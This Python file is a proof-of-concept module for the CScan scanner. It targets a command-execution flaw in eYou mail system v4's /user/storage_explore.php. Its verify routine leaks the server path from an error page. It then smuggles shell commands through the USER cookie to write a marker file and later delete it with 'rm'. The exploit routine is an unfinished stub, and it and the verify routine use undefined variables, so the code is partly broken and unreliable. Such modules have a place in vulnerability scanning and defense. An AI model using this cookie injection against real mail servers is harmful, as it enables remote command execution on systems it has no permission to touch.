# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib
import urllib2
import re
import string
import random


class Vuln(ABVuln):
    vuln_id = 'eYou_0017_p'  # 平台漏洞编号，留空
    name = 'eYou v4 /storage_explore.php 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-07-23'  # 漏洞公布时间
    desc = '''
        eYou邮件系统V4存在一处/user/storage_explore.php页面，该页面调用了
        getUserDirPath($uid, $domain)函数，该函数存在的$path = `$cmd`代码
        使得CMD控制台可以直接调用。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=058301
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'eYou'  # 漏洞应用名称
    product_version = 'v4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2b6c8c32-999f-4b0e-8677-9da5adf73e54'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            def random_str(x): return ''.join(
                random.sample(string.letters+string.digits, x))
            vul_url_get_path = '{target}/user/list.php'.format(
                target=self.target)
            vul_url_get_shell = '{target}/user/storage_explore.php'.format(
                target=self.target)
            match_path = re.compile(
                'eyou_error\(\) in <b>(.*)/list\.php</b> on line')

            # main
            response = urllib2.urlopen(vul_url_get_path).read()
            path = match_path.findall(response)

            if path:
                file_name = random_str(5)
                headers = {
                    'Cookie': 'USER=UID=1+|echo tEst_bY_360 > %s/%s.txt' % (path[0], file_name)}
                urllib2.urlopen(urllib2.Request(
                    vul_url_get_shell, headers=headers)).read()
                response = urllib2.urlopen(
                    '%s/user/%s.txt' % (url, file_name)).read()
                # remove verify txt
                headers = {
                    'Cookie': 'USER=UID=1+|rm %s/%s.txt' % (path[0], file_name)}
                urllib2.urlopen(urllib2.Request(
                    vul_url_get_shell, headers=headers)).read()
                if 'tEst_bY_360' in response:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))

            if res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的*********为{data}'.format(
                    target=self.target, name=self.vuln.name, data=exploit_data))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()